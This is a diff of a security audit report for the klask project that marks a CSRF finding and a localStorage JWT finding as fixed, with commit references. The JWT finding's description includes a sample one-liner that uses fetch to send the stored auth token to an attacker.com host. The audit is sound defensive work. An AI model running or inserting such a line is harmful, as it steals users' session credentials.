@@ -192,7 +192,7 @@ curl -X POST http://localhost:3000/api/repositories \
 - **CWE**: CWE-352 (Cross-Site Request Forgery)
 - **Component**: Frontend
 - **Location**: `klask-react/src/lib/api.ts:79-115`
-- **Status**: Open
+- **Status**: Fixed — 8b977a8
 
 **Description**: The frontend generates a random CSRF token via `crypto.getRandomValues()`, stores it in localStorage, and sends it as `X-CSRF-Token` on all mutating requests. The backend contains **zero validation** of this header (no occurrence of "csrf", "CSRF", or "X-CSRF-Token" anywhere in `klask-rs/src/`). This is security theater — it provides zero protection.
 
@@ -208,7 +208,7 @@ Since the JWT is stored in localStorage (not in an HttpOnly cookie), classic CSR
 - **CWE**: CWE-668 (Exposure of Resource to Wrong Sphere)
 - **Component**: Frontend
 - **Location**: `klask-react/src/lib/api.ts:72,178`
-- **Status**: Open
+- **Status**: Fixed — 85cfacb (backend cookie), 8b977a8 (frontend migration)
 
 **Description**: The JWT is stored in `localStorage` (`authToken` key). Any XSS vulnerability (see KLASK-FE-003, KLASK-FE-005, KLASK-BE-015) can exfiltrate this token with a one-liner: `fetch('https://attacker.com/?t='+localStorage.getItem('authToken'))`.
 
